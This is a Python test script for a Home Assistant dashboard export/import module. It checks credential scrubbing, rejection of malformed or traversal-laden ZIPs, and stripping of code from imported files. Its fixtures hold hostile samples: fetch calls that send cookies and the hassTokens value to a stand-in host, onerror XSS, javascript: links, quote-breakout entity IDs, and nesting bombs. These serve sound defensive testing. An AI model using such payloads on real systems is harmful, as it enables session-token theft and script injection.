"""Dashboard export/import file (share.py) – without HA, without pytest.

  python3 dev/unit/share_test.py

Checked: what the export contains (dashboard, phone layout, chosen settings, own photos, no
credentials or login signatures), what import rejects (no file, no ZIP, damaged ZIP, not Casora,
newer format, missing views, paths outside photos/), the preview (rooms, tiles, missing entities,
services are no entities), entity mapping, moved links, photo name clashes and staging expiry.
"""

from __future__ import annotations

import importlib.util
import io
import json
import os
import re
import sys
import types
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
# A package without its __init__ (that one needs HA), so share.py can import template_print.
PKG = types.ModuleType("casora_share_pkg")
PKG.__path__ = [os.path.join(ROOT, "custom_components/casora")]
sys.modules["casora_share_pkg"] = PKG
spec = importlib.util.spec_from_file_location("casora_share_pkg.share", os.path.join(ROOT, "custom_components/casora/share.py"))
sh = importlib.util.module_from_spec(spec)
sys.modules["casora_share_pkg.share"] = sh
spec.loader.exec_module(sh)
BUNDLE = json.load(open(os.path.join(ROOT, "custom_components/casora/panel/casora-templates.json"), encoding="utf-8"))["templates"]
SHIPPED = frozenset(BUNDLE)

FAILS: list[str] = []


def check(ok: bool, msg: str) -> None:
    if not ok:
        FAILS.append(msg)
        print("  FAIL:", msg)


def raises(fn, code: str, msg: str) -> None:
    try:
        fn()
    except sh.ShareError as err:
        check(err.code == code, f"{msg}: code {err.code}, expected {code}")
        return
    except Exception as err:  # noqa: BLE001 – anything else is a crash of the import
        check(False, f"{msg}: {type(err).__name__} instead of ShareError")
        return
    check(False, f"{msg}: no error")


def room(path, name, image, tiles):
    return {"path": path, "title": name, "cards": [
        {"type": "custom:button-card", "template": "casora_room", "name": name,
         "variables": {"image": image, "image_night": image + "-night", "climate_entity": "climate.example_room"}},
        {"type": "custom:casora-smart-row", "cards": tiles},
    ]}


LIGHT = {"type": "custom:button-card", "template": "casora_light", "entity": "light.example_ceiling",
         "tap_action": {"action": "perform-action", "perform_action": "light.toggle"}}
NAV = {"type": "custom:button-card", "template": "casora_scene", "entity": "scene.example_evening",
       "tap_action": {"action": "navigate", "navigation_path": "/casora-home/kitchen"}}
CUSTOM = {"type": "custom:button-card", "template": "casora_custom",
          "name": "[[[ return states['sensor.example_power'].state ]]]"}
DESK = {
    "views": [room("home", "Home", "home-demo", [NAV]),
              room("kitchen", "Kitchen", "kitchen-0123456789ab", [LIGHT, CUSTOM]),
              room("office", "Office", "/api/casora/photo/office-aaaaaaaaaaaa.jpg?v=3&authSig=SECRET", [])],
    "button_card_templates": {"casora_light": {"variables": {"x": "light.template_only"}},
                              "casora_nav": {"tap_action": {"navigation_path": "/casora-home/kitchen"}}},
    "casora_template_fingerprint": {},
    "kiosk_mode": {"api_key": "SECRET", "access_token": "SECRET", "label": "kept"},
}
PHONE = {"views": [{"path": "start", "cards": [
    {"type": "custom:button-card", "template": "casora_mobile_bg"},
    {"type": "custom:button-card", "template": "casora_light", "entity": "light.example_ceiling",
     "tap_action": {"action": "navigate", "navigation_path": "/casora-home-mobile/kitchen"}}]}]}
SETTINGS = {"security": {"covers": ["cover.example_blind"]}, "notify": {"zone_phrases": {"x": "private"}},
            "contacts": {"groups": []}, "umzug": {"off": True}}
PHOTOS = {"kitchen-0123456789ab.jpg": b"\xff\xd8\xffDAY", "kitchen-0123456789ab-night.jpg": b"\xff\xd8\xffNIGHT",
          "office-aaaaaaaaaaaa.jpg": b"\xff\xd8\xffOFFICE"}


def export(**kw) -> bytes:
    args = dict(title="Mein Zuhause", url_path="casora-home", mobile_url="casora-home-mobile", config=DESK,
                mobile=PHONE, settings=SETTINGS, photos=PHOTOS, version="26.11.2", exported="2026-11-01T10:00:00+01:00")
    args.update(kw)
    return sh.build_export(**args)


def zip_of(files: dict[str, bytes | str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in files.items():
            z.writestr(n, d)
    return buf.getvalue()


print("export: contents")
data = export()
z = zipfile.ZipFile(io.BytesIO(data))
names = set(z.namelist())
check({"manifest.json", "dashboard.json", "mobile.json", "settings.json"} <= names, f"files: {sorted(names)}")
man = json.loads(z.read("manifest.json"))
check(man["format"] == 1 and man["kind"] == "casora-dashboard", f"manifest format/kind: {man}")
check(man["rooms"] == ["Home", "Kitchen", "Office"], f"rooms: {man['rooms']}")
check(man["tiles"] == 3, f"tiles: {man['tiles']}")
check(man["phone"] is True and man["mobile_url"] == "casora-home-mobile", "phone layout named")
text = z.read("dashboard.json").decode()
check("SECRET" not in text, "credentials and authSig removed from the dashboard")
check('"label":"kept"' in text, "other keys stay (kiosk_mode travels)")
check("/api/casora/photo/office-aaaaaaaaaaaa.jpg?v=3" in text, "photo URL kept without authSig")
sets = json.loads(z.read("settings.json"))
check(sorted(sets) == ["contacts", "security"], f"only dashboard settings: {sorted(sets)}")
check(sorted(n for n in names if n.startswith("photos/")) == ["photos/" + n for n in sorted(PHOTOS)], "photos inside")
check(sh.file_name("Mein Zuhause (Küche)", "2026-11-01") == "casora-mein-zuhause-kueche-2026-11-01.casora", "file name")
# Candidates only: the export takes the ones that exist as own photo files.
pb = sh.photo_bases([DESK])
check({"kitchen-0123456789ab", "office-aaaaaaaaaaaa"} <= pb and "home-demo" not in pb
      and "kitchen-0123456789ab-night" not in pb, f"photo names (no demo, night folded): {pb}")
no_photos = zipfile.ZipFile(io.BytesIO(export(photos={}, settings={}, mobile=None)))
check(not any(n.startswith("photos/") for n in no_photos.namelist()) and "settings.json" not in no_photos.namelist()
      and "mobile.json" not in no_photos.namelist(), "without photos/settings/phone: none of them inside")
raises(lambda: export(config={"title": "x"}), "broken", "export of a config without views")

print("import: rejected files")
raises(lambda: sh.read_file(b""), "empty", "empty file")
raises(lambda: sh.read_file(b"views:\n - title: x\n"), "not_casora", "YAML instead of an export")
raises(lambda: sh.read_file(data[: len(data) // 2]), "broken", "cut-off file")
raises(lambda: sh.read_file(zip_of({"readme.txt": "hi"})), "not_casora", "ZIP without manifest")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "other", "format": 1}'})), "not_casora", "other kind")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 2}',
                                    "dashboard.json": '{"views": []}'})), "newer_format", "newer format")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": "1"}',
                                    "dashboard.json": '{"views": []}'})), "broken", "format not a number")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}'})),
       "broken", "dashboard.json missing")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}',
                                    "dashboard.json": '{"views": "no"}'})), "broken", "views not a list")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}',
                                    "dashboard.json": "{not json"})), "broken", "dashboard not JSON")
evil = sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}',
                            "dashboard.json": '{"views": []}', "photos/../../secrets.yaml": "x",
                            "photos/Upper.JPG": "x", "photos/ok-photo.jpg": "x"}))
check(sorted(evil["photos"]) == ["ok-photo.jpg"], f"only plain photo names: {sorted(evil['photos'])}")

print("import: preview and mapping")
staged = sh.read_file(data)
known = {"light.example_ceiling", "scene.example_evening", "climate.example_room"}
pv = sh.preview(staged, known)
check(pv["title"] == "Mein Zuhause" and pv["phone"] and pv["tiles"] == 3 and pv["photos"] == 2, f"preview: {pv}")
check(pv["missing"] == ["cover.example_blind"], f"missing entities: {pv['missing']}")
check("light.toggle" not in sh.entity_refs([DESK]), "services are no entities")
check("light.template_only" not in sh.entity_refs([DESK]), "templates are not scanned")
mapped = sh.apply_mapping(DESK, {"light.example_ceiling": "light.other_ceiling",
                                 "sensor.example_power": "sensor.other_power",
                                 "light.example_ceiling_2": "switch.wrong_domain"})
t = json.dumps(mapped)
check("light.other_ceiling" in t and "light.example_ceiling" not in t, "whole value mapped")
check("states['sensor.other_power']" in t, "entity inside custom card code mapped")
check('"perform_action": "light.toggle"' in t, "services untouched")
check(sh.apply_mapping(DESK, {"light.example_ceiling": "switch.x"}) == DESK, "other domain is not mapped")

out = sh.prepare(staged, url_path="casora-copy", mobile_url="casora-copy-mobile",
                 mapping={"cover.example_blind": "cover.living_blind"}, renames={"kitchen-0123456789ab": "kitchen-ffffffffffff"},
                 with_settings=True)
t = json.dumps(out["config"])
check("/casora-copy/kitchen" in t and "/casora-home/" not in t, "links moved to the new dashboard (templates too)")
check("/casora-copy-mobile/kitchen" in json.dumps(out["mobile"]), "phone links moved")
check('"kitchen-ffffffffffff"' in t and '"kitchen-ffffffffffff-night"' in t, "renamed photo, day and night")
ren = sh.rename_photos({"path": "kitchen", "image": "kitchen", "x": "/api/casora/photo/kitchen.jpg?v=1", "name": "kitchen"},
                       {"kitchen": "kitchen-ffffffffffff"})
check(ren == {"path": "kitchen", "image": "kitchen-ffffffffffff", "x": "kitchen-ffffffffffff", "name": "kitchen"},
      f"only photo values renamed, never a room path: {ren}")
check(out["settings"]["security"]["covers"] == ["cover.living_blind"], "settings mapped")
check(sh.prepare(staged, url_path="x", mobile_url=None, mapping={}, renames={}, with_settings=False)["settings"] is None
      and sh.prepare(staged, url_path="x", mobile_url=None, mapping={}, renames={}, with_settings=False)["mobile"] is None,
      "without settings/phone: none")

moved = sh.move_links({"a": "/casora/kitchen", "b": "/api/casora/photo/x.jpg", "c": "[[[ nav('/casora/office') ]]]",
                       "d": "/casora-mobile/x", "e": "/casora"}, [("casora", "new-home")])
check(moved == {"a": "/new-home/kitchen", "b": "/api/casora/photo/x.jpg", "c": "[[[ nav('/new-home/office') ]]]",
                "d": "/casora-mobile/x", "e": "/new-home"}, f"links only where they are the dashboard: {moved}")
check(sh.scrub({"u": "rtsp://user:secret@example.com/stream"}) == {"u": "rtsp://example.com/stream"}, "credentials in URLs removed")

print("import: photos")
write, ren = sh.photo_plan(PHOTOS, {"kitchen-0123456789ab.jpg": b"\xff\xd8\xffDAY",
                                    "kitchen-0123456789ab-night.jpg": b"\xff\xd8\xffNIGHT", "office-aaaaaaaaaaaa.jpg": None})
check(sorted(write) == ["office-aaaaaaaaaaaa.jpg"] and not ren, f"same photo not written twice: {sorted(write)} {ren}")
write, ren = sh.photo_plan(PHOTOS, {"kitchen-0123456789ab.jpg": b"\xff\xd8\xffOTHER"})
nb = ren.get("kitchen-0123456789ab", "")
check(nb.startswith("kitchen-") and nb != "kitchen-0123456789ab", f"clash gets a new name: {ren}")
check(nb + ".jpg" in write and nb + "-night.jpg" in write, "day and night move together")
check("kitchen-0123456789ab.jpg" not in write, "never overwrites a different photo")
known = {sh._sha(b"\xff\xd8\xffDAY"): "kitchen-111111111111.jpg", sh._sha(b"\xff\xd8\xffNIGHT"): "kitchen-111111111111-night.jpg"}
write, ren = sh.photo_plan(PHOTOS, {"kitchen-0123456789ab.jpg": b"\xff\xd8\xffOTHER"}, known)
check(ren.get("kitchen-0123456789ab") == "kitchen-111111111111" and not any(n.startswith("kitchen") for n in write),
      f"photos imported before are reused, not copied again: {ren} {sorted(write)}")

print("own room symbols")
ICON_CFG = {"views": [{"path": "kitchen", "cards": [
    {"type": "custom:button-card", "template": "casora_room",
     "variables": {"room_icon": "/local/casora/icons/eigene/sofa.svg"}},
    {"type": "custom:button-card", "template": "casora_room",
     "variables": {"room_icon": "/local/casora/icons/eigene/plant-2.png", "style": "url('/local/casora/icons/eigene/sofa.svg')"}},
    {"type": "custom:button-card", "template": "casora_room", "variables": {"room_icon": "kitchen"}}]}],
    "button_card_templates": {"x": {"icon": "/local/casora/icons/eigene/template-only.svg"}}}
check(sh.icon_names([ICON_CFG, None]) == {"sofa.svg", "plant-2.png"}, f"symbols named: {sh.icon_names([ICON_CFG])}")
ICONS = {"sofa.svg": b"<svg>SOFA</svg>", "plant-2.png": b"PNGPLANT"}
data = export(config=ICON_CFG, mobile=None, icons=ICONS)
z = zipfile.ZipFile(io.BytesIO(data))
check({"icons/sofa.svg", "icons/plant-2.png"} <= set(z.namelist()), f"symbols in the file: {z.namelist()}")
check(json.loads(z.read("manifest.json"))["icons"] == ["plant-2.png", "sofa.svg"], "manifest lists the symbols")
got = sh.read_file(data)
check(got["icons"] == ICONS, f"symbols read back: {sorted(got['icons'])}")
check(sh.preview(got, set())["icons"] == 2, "preview counts the symbols")
bad = sh.read_file(zip_of({"manifest.json": json.dumps({"format": 1, "kind": "casora-dashboard"}),
                           "dashboard.json": json.dumps({"views": []}), "icons/../evil.svg": "x",
                           "icons/Big.SVG": "x", "icons/sofa.svg": "x" * (sh.MAX_ICON + 1)}))
check(bad["icons"] == {}, f"no paths outside, no odd names, no giants: {sorted(bad['icons'])}")
# Import: same symbol stays, a name taken by another symbol is renamed, a symbol here under another name is reused.
write, ren = sh.icon_plan(ICONS, {"sofa.svg": b"<svg>SOFA</svg>"})
check(write == {"plant-2.png": b"PNGPLANT"} and not ren, f"same symbol not written twice: {sorted(write)} {ren}")
write, ren = sh.icon_plan(ICONS, {"sofa.png": b"OTHER", "sofa-2.svg": b"OTHER2", "plant-2.png": b"OTHER3"})
check(ren == {"sofa.svg": "sofa-3.svg", "plant-2.png": "plant-3.png"} and sorted(write) == ["plant-3.png", "sofa-3.svg"],
      f"clash gets the next free name: {ren} {sorted(write)}")
write, ren = sh.icon_plan(ICONS, {"couch.svg": b"<svg>SOFA</svg>"})
check(ren == {"sofa.svg": "couch.svg"} and "sofa.svg" not in write and "couch.svg" not in write,
      f"symbol here under another name is reused: {ren} {sorted(write)}")
staged = {"manifest": {"url_path": "casora-home"}, "config": ICON_CFG, "mobile": None, "settings": {}, "photos": {}, "icons": ICONS}
out = sh.prepare(staged, url_path="casora-home", mobile_url=None, mapping={}, renames={}, with_settings=False,
                 icon_renames={"sofa.svg": "sofa-3.svg"})
txt = json.dumps(out["config"])
check(txt.count("/local/casora/icons/eigene/sofa-3.svg") == 2 and "eigene/sofa.svg" not in txt
      and "eigene/plant-2.png" in txt, f"paths point at the new name: {txt}")

# ─── No code from a file (HACS review round 5, point 3) ──────────────────────
tp_spec = importlib.util.spec_from_file_location("casora_share_pkg.template_print",
                                                 os.path.join(ROOT, "custom_components/casora/template_print.py"))
tp = importlib.util.module_from_spec(tp_spec)
sys.modules["casora_share_pkg.template_print"] = tp
tp_spec.loader.exec_module(tp)
MOTION_OK = ("[[[ const b = states['input_boolean.casora_motion_badges']; if (b && b.state !== 'on') return false;"
             " const s = states['binary_sensor.example_motion']; return !!s && s.state === 'on'; ]]]")
SCENE_EXPR = getattr(sh, "SCENE_BADGE_EXPR", "")


def codes(obj) -> list[str]:
    """Every string (value or key) that could run as JavaScript."""
    out: list[str] = []
    stack = [obj]
    while stack:
        o = stack.pop()
        if isinstance(o, dict):
            out.extend(k for k in o if isinstance(k, str) and ("[[[" in k or "]]]" in k))
            stack.extend(o.values())
        elif isinstance(o, list):
            stack.extend(o)
        elif isinstance(o, str) and ("[[[" in o or "]]]" in o):
            out.append(o)
    return out


def foreign_code(obj) -> list[str]:
    """Code that is not one of the expressions the Studio writes itself."""
    return [c for c in codes(obj) if c not in (SCENE_EXPR, MOTION_OK)]


def try_read(data):
    try:
        return sh.read_file(data, SHIPPED)
    except TypeError:  # before the fix read_file took no template names
        return sh.read_file(data)


print("no code from a file: the Studio's own expressions match casora-panel.js")
panel = open(os.path.join(ROOT, "custom_components/casora/panel/casora-panel.js"), encoding="utf-8").read()
LIT = r'"(?:[^"\\]|\\.)*"'
m = re.search(r"const SCENE_BADGE_EXPR = ((?:\s*\+?\s*" + LIT + r")+);", panel)
js_scene = "".join(json.loads(x) for x in re.findall(LIT, m.group(1))) if m else None
check(js_scene is not None and js_scene == SCENE_EXPR, f"SCENE_BADGE_EXPR as in the Studio: {js_scene!r}")
m = re.search(r"route\.badge = \{ show: ((?:\s*\+?\s*(?:" + LIT + r"|m\b))+) \};", panel)
js_motion = "".join("binary_sensor.example_motion" if x == "m" else json.loads(x)
                    for x in re.findall(LIT + r"|\bm\b", m.group(1))) if m else None
check(js_motion == MOTION_OK, f"motion badge as in the Studio: {js_motion!r}")
check(getattr(sh, "motion_badge", lambda e: None)("binary_sensor.example_motion") == MOTION_OK, "motion_badge() builds it")

print("no code from a file: a hostile file")
EVIL = "[[[ fetch('https://example.invalid/?' + document.cookie) ]]]"
casora_light_mod = dict(BUNDLE["casora_light"], name=EVIL)
deep: dict = {"type": "custom:button-card", "template": "casora_light", "name": EVIL}
for _ in range(40):
    deep = {"type": "vertical-stack", "cards": [deep, {"type": "markdown", "content": "fine"}]}
HOSTILE = {
    "title": "Hostile",
    "button_card_templates": {
        "casora_light": casora_light_mod,                       # modified Casora template …
        "evil_tpl": {"name": EVIL, "variables": {"x": EVIL}},   # … a foreign one …
        "own_fancy": {"template": "casora_light", "name": EVIL,  # … and an own tile type with code
                      "variables": {"casora_tile": {"label": "Fancy", "base": "casora_light"}}},
        "own_orphan": {"variables": {"casora_tile": {"base": "evil_tpl"}}},
    },
    # A fingerprint that does not match the modified casora_light: the refresh would keep it as „the user's own“.
    "casora_template_fingerprint": {"casora_light": "fake", "evil_tpl": "0"},
    "decluttering_templates": {"t": {"card": {"type": "custom:button-card", "name": "[[x]]"}}},
    "kiosk_mode": {"hide_header": EVIL, "admin_settings": {"hide_sidebar": True}},
    "views": [{"path": "home", "title": "Home", "cards": [
        {"type": "custom:button-card", "template": "casora_room", "name": EVIL,
         "variables": {"image": "home-demo", "x": EVIL, "scene_entities": "[[[ steal() ]]]", "show_scenes": True,
                       "list": ["ok", EVIL, {"deeper": [EVIL]}], "half_a": "[[", "half_b": "[ steal() ]]]",
                       "padded": "   \n[[[ steal() ]]]\n  ", EVIL: "key is code"}},
        {"type": "custom:casora-nav", "routes": [
            {"url": "/hostile/home", "label": "Home", "badge": {"show": MOTION_OK}},
            {"url": "/hostile/x", "label": "X", "badge": {"show": MOTION_OK.replace(
                "binary_sensor.example_motion", "binary_sensor.a']; steal(); //")}},
            {"url": "/hostile/y", "label": "Y", "badge": {"show": "[[[ return steal() ]]]"}}]},
        {"type": "custom:button-card", "template": ["casora_light", "evil_tpl"], "entity": "light.example_ceiling",
         "card_mod": {"style": EVIL},
         "custom_fields": {"f": {"card": {"type": "custom:button-card", "name": EVIL,
                                          "styles": {"card": [{"color": EVIL}]}}}},
         "variables": {"popup_extra_cards": [{"type": "markdown", "content": EVIL},
                                             {"type": "custom:button-card", "entity": "light.example_ceiling"}]}},
        {"type": "custom:button-card", "template": "own_fancy", "entity": "light.example_ceiling"},
        {"type": "custom:button-card", "template": ["own_orphan"], "entity": "light.example_ceiling"},
        deep,
    ]}],
}
HOSTILE_PHONE = {"views": [{"path": "start", "cards": [{"type": "custom:button-card", "template": "casora_mobile_bg",
                                                       "name": EVIL}]}],
                 "button_card_templates": HOSTILE["button_card_templates"],
                 "casora_template_fingerprint": HOSTILE["casora_template_fingerprint"]}
hostile_file = zip_of({"manifest.json": json.dumps({"format": 1, "kind": "casora-dashboard", "url_path": "hostile",
                                                    "mobile_url": "hostile-mobile", "title": "Hostile"}),
                       "dashboard.json": json.dumps(HOSTILE), "mobile.json": json.dumps(HOSTILE_PHONE),
                       "settings.json": json.dumps({"scenes": {"names": {"scene.x": EVIL}, "order": ["scene.x"]},
                                                    "notify": {"x": EVIL}})})
st = try_read(hostile_file)
for part in ("config", "mobile"):
    c = st[part]
    check("button_card_templates" not in c and "casora_template_fingerprint" not in c and "decluttering_templates" not in c,
          f"{part}: no templates, no fingerprint, no other card's templates from the file: {sorted(c)}")
    check(not foreign_code(c), f"{part}: no code from the file left: {foreign_code(c)[:4]}")
check(not codes(st["settings"]) and st["settings"]["scenes"]["order"] == ["scene.x"], f"settings without code: {st['settings']}")
hv = st["config"]["views"][0]["cards"][0]["variables"]
check(hv.get("scene_entities") == SCENE_EXPR and hv.get("show_scenes") is True,
      "home scene badge: Casora's own expression, not the file's")
check("half_a" in hv and "half_b" not in hv, "a closing ]]] alone is dropped too (no joining of halves)")
check(hv.get("list") == ["ok", {"deeper": []}], f"code in lists dropped, the rest kept: {hv.get('list')}")
routes = st["config"]["views"][0]["cards"][1]["routes"]
check([r.get("badge") for r in routes] == [{"show": MOTION_OK}, {}, {}],
      f"motion badge kept only in Casora's exact form: {[r.get('badge') for r in routes]}")
tiles_c = st["config"]["views"][0]["cards"]
check(tiles_c[3]["template"] == "casora_light", "own tile type points at its Casora base")
check(tiles_c[4]["template"] == ["own_orphan"], "own tile type without a Casora base stays as it is (shown as missing)")
check(st["config"]["kiosk_mode"] == {"admin_settings": {"hide_sidebar": True}}, f"kiosk_mode without code: {st['config'].get('kiosk_mode')}")
lo = st.get("left_out") or {}
check(lo.get("templates") == 3 and lo.get("code", 0) >= 15, f"preview counts what stays out: {lo}")
check(sh.preview(st, set()).get("left_out") == lo, "preview carries left_out")

print("no code from a file: HTML, other cards' code, javascript: links")
XSS = "<img src=x onerror=\"fetch('https://example.invalid/?'+localStorage.hassTokens)\">"
OTHER = {"views": [{"path": "x", "cards": [
    {"type": "custom:button-card", "name": XSS, "label": "Plain <3 label", "tooltip": XSS, "custom_fields": {"z": XSS}},
    {"type": "markdown", "content": "**Hold**<br><small>keep pressing</small>", "title": "<b>x</b>"},
    {"type": "custom:config-template-card", "entities": ["light.example_ceiling"], "card": {"type": "entities"}},
    {"type": "custom:apexcharts-card", "series": [{"entity": "sensor.example_power", "data_generator": "return []"}]},
    {"type": "vertical-stack", "cards": [{"type": " Custom:Config-Template-Card ", "x": 1}, {"type": "custom:casora-nav"},
                                         {"type": "custom:layout-card", "cards": []}]},
    {"type": "iframe", "url": "java\tscript:alert(1)"},
    {"type": "custom:button-card", "template": ["own_b"], "tap_action": {"action": "url", "url_path": " JavaScript:alert(1)"},
     "hold_action": {"action": "perform-action", "perform_action": "browser_mod.javascript", "data": {"code": "alert(1)"}},
     "variables": {"scene_entities": "[[[ steal() ]]]"}},
    {"type": "markdown", "content": "x", "scene_entities": "[[[ steal() ]]]"},
]}], "button_card_templates": {
    "own_a": {"template": "casora_light", "variables": {"casora_tile": {"base": "casora_light"}}},
    "own_b": {"template": "own_a", "variables": {"casora_tile": {"base": "own_a"}}}}}
oc, olo = sh.clean_dashboard(OTHER, SHIPPED)
ot = json.dumps(oc)
cards_o = oc["views"][0]["cards"]
check("onerror" not in ot and cards_o[0].get("label") == "Plain <3 label",
      f"HTML tags in tile text dropped, a plain '<3' kept: {cards_o[0]}")
check(cards_o[1] == {"type": "markdown", "content": "**Hold**<br><small>keep pressing</small>"},
      f"HA's markdown content keeps its HTML (HA sanitises it), HTML elsewhere goes: {cards_o[1]}")
check("config-template-card" not in ot.lower() and "apexcharts" not in ot,
      "custom cards Casora does not use stay behind (also with odd spelling)")
check([c.get("type") for c in cards_o[2]["cards"]] == ["custom:casora-nav", "custom:layout-card"],
      f"Casora's own and layout cards stay: {cards_o[2]}")
check("url" not in cards_o[3] and "url_path" not in cards_o[4]["tap_action"], "javascript: links dropped")
check("perform_action" not in cards_o[4]["hold_action"], "browser_mod.javascript dropped")
check("scene_entities" not in cards_o[4].get("variables", {}) and "scene_entities" not in cards_o[5],
      "Casora's scene expression only on a casora_room card, nowhere else")
check(cards_o[4]["template"] == ["casora_light"], f"own type on an own type: the Casora base at the end: {cards_o[4]['template']}")
# Data the Studio or a template later puts into code (retargetRoutes: motion_entity; popup helpers), Jinja that
# auto-entities turns into cards, data: pages.
BENT = {"views": [{"path": "x", "cards": [
    {"type": "custom:button-card", "template": "casora_room", "name": "Hall",
     "variables": {"motion_entity": "binary_sensor.mx'];fetch('//example.invalid');//", "light_entity_1": "light.example_ceiling",
                   "action_1_confirm_helper": "input_boolean.x', y='", "climate_entity_1": "climate.example_room",
                   "note": "sensor.example_power) or (x", "plain": "Mom's room (upstairs)"}},
    {"type": "custom:auto-entities", "card": {"type": "custom:casora-swipe-card"}, "card_param": "cards",
     "filter": {"template": "{{ [{'type':'custom:button-card','name':'['~'[[ x ]'~']]'}] | tojson }}",
                "include": [{"entity_id": "plant.example_plant"}]}},
    {"type": "markdown", "content": "{{ states('sensor.example_power') }} W"},
    {"type": "iframe", "url": "data:text/html;base64,PHNjcmlwdD4="},
    {"type": "picture", "image": "data:image/png;base64,iVBORw0KGgo="},
]}]}
bc, _ = sh.clean_dashboard(BENT, SHIPPED)
bv = bc["views"][0]["cards"][0]["variables"]
check(sorted(bv) == ["climate_entity_1", "light_entity_1", "plain"],
      f"entity values with quotes or brackets dropped, real IDs and plain text kept: {sorted(bv)}")
check(bc["views"][0]["cards"][1]["filter"] == {"include": [{"entity_id": "plant.example_plant"}]},
      f"Jinja outside markdown dropped: {bc['views'][0]['cards'][1]}")
check(bc["views"][0]["cards"][2]["content"].startswith("{{"), "markdown keeps its Jinja (HA renders it as text)")
check("url" not in bc["views"][0]["cards"][3] and bc["views"][0]["cards"][4].get("image", "").startswith("data:image/"),
      "data: pages dropped, data: images kept")
# Round 3: auto-entities eval_js / ${…}, „markdown“ claimed by a custom_fields entry, browser_mod's bare
# javascript service, a foreign layout_type, data: pages outside image keys, the file's dashboard address.
R3 = {"views": [{"path": "x", "cards": [
    {"type": "custom:auto-entities", "card": {"type": "entities"},
     "filter": {"include": [{"domain": "light", "options": {"eval_js": True, "name": "${alert(document.cookie)}"}}]}},
    {"type": "custom:button-card", "template": "casora_light",
     "custom_fields": {"type": "markdown", "content": "<img src=x onerror=alert(1)>"},
     "tap_action": {"action": "fire-dom-event", "browser_mod": {"service": "javascript", "data": {"code": "alert(1)"}}}},
    {"type": "custom:layout-card", "layout_type": "custom:evil-layout", "cards": []},
    {"type": "custom:layout-card", "layout_type": "custom:grid-layout", "cards": []},
    {"type": "iframe", "url": "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"},
    {"type": "vertical-stack", "cards": [{"type": "markdown", "content": "sun. It's <b>sunny</b> (maybe)"}]},
]}]}
rc, _ = sh.clean_dashboard(R3, SHIPPED)
rt = json.dumps(rc)
check("eval_js" not in rt and "${" not in rt, "auto-entities eval_js and ${…} dropped")
check("onerror" not in rt, "a custom_fields entry called like a markdown card keeps no HTML")
check('"javascript"' not in rt, "browser_mod's bare javascript service dropped")
check("evil-layout" not in rt and "custom:grid-layout" in rt, "foreign layout_type dropped, grid-layout kept")
check("url" not in rc["views"][0]["cards"][4], "data: SVG outside an image key dropped")
check(rc["views"][0]["cards"][5]["cards"][0]["content"] == "sun. It's <b>sunny</b> (maybe)", "a real markdown card keeps its text")
st_bad = {"manifest": {"url_path": '","x":"', "mobile_url": "ok-mobile"}, "config": {"views": [{"path": "a", "cards": [
    {"type": "custom:button-card", "tap_action": {"action": "navigate", "navigation_path": '/","x":"/a'}}]}]},
          "mobile": None, "settings": {}, "photos": {}, "icons": {}}
check(sh.prepare(st_bad, url_path="new", mobile_url=None, mapping={}, renames={}, with_settings=False)["config"]
      == st_bad["config"], "a bent dashboard address in the manifest moves nothing")
z3 = zipfile.ZipFile(io.BytesIO(export(settings={"night_entity": "[[[ x ]]]", "security": {"covers": ["cover.example_blind"]}})))
check(json.loads(z3.read("settings.json")) == {"security": {"covers": ["cover.example_blind"]}},
      "export: a section that was only code is left out, not written as null")
st3 = sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}', "dashboard.json": '{"views": []}',
                           "settings.json": json.dumps({"night_entity": "[[[ x ]]]", "scenes": {"a": "[[[ y ]]]"}})}))
check(st3["settings"] == {}, f"import: sections left empty are not taken (would wipe the receiver's): {st3['settings']}")
for bad_cards in ({"a": 1}, 5, True):
    raises(lambda bc=bad_cards: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}',
                                                     "dashboard.json": json.dumps({"views": [{"cards": bc}]})})),
           "broken", f"cards as {type(bad_cards).__name__}")

print("no code from a file: what gets written")
out = sh.prepare(st, url_path="copy", mobile_url="copy-mobile", mapping={"light.example_ceiling": "light.other"},
                 renames={}, with_settings=True)
ship = getattr(sh, "ship_templates", None)
if ship is None:  # before the fix: the apply step kept the file's templates through refresh_dashboard
    w_cfg = tp.refresh_dashboard(out["config"], BUNDLE)[0] or out["config"]
    w_mob = tp.refresh_dashboard(out["mobile"], BUNDLE, mobile=True)[0] or out["mobile"]
else:
    w_cfg, w_mob = ship(out["config"], out["mobile"], BUNDLE)
for name, w in (("desktop", w_cfg), ("phone", w_mob)):
    tpl = w.get("button_card_templates") or {}
    check(set(tpl) == SHIPPED, f"{name}: exactly the shipped templates: extra {sorted(set(tpl) - SHIPPED)[:5]}")
    check(all(tp.template_print(tpl.get(k), k) == tp.template_print(BUNDLE[k], k) for k in SHIPPED),
          f"{name}: every template as shipped (the modified casora_light is gone)")
    check(w.get("casora_template_fingerprint") == {k: tp.template_print(v, k) for k, v in tpl.items()},
          f"{name}: fingerprint computed from what is written")
    check(not foreign_code({k: v for k, v in w.items() if k != "button_card_templates"}), f"{name}: no file code in the views")
check(EVIL not in json.dumps(w_cfg) and EVIL not in json.dumps(w_mob), "the hostile text appears nowhere")
check("/copy/home" in json.dumps(w_cfg["views"]) and "light.other" in json.dumps(w_cfg["views"]),
      "links moved and entities mapped as before")
check(not codes(out["settings"]), "settings written without code")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}',
                                    "dashboard.json": '{"views": [' + '{"cards": [' * 150 + ']}' * 150 + ']}'})),
       "broken", "nesting deeper than a dashboard")
raises(lambda: sh.read_file(zip_of({"manifest.json": '{"kind": "casora-dashboard", "format": 1}',
                                    "dashboard.json": '{"views": [{"cards": ' + "[" * 100000 + "]" * 100000 + "}]}"})),
       "broken", "nesting deeper than Python's recursion limit")

print("no code from a file: a normal Casora dashboard travels unchanged")
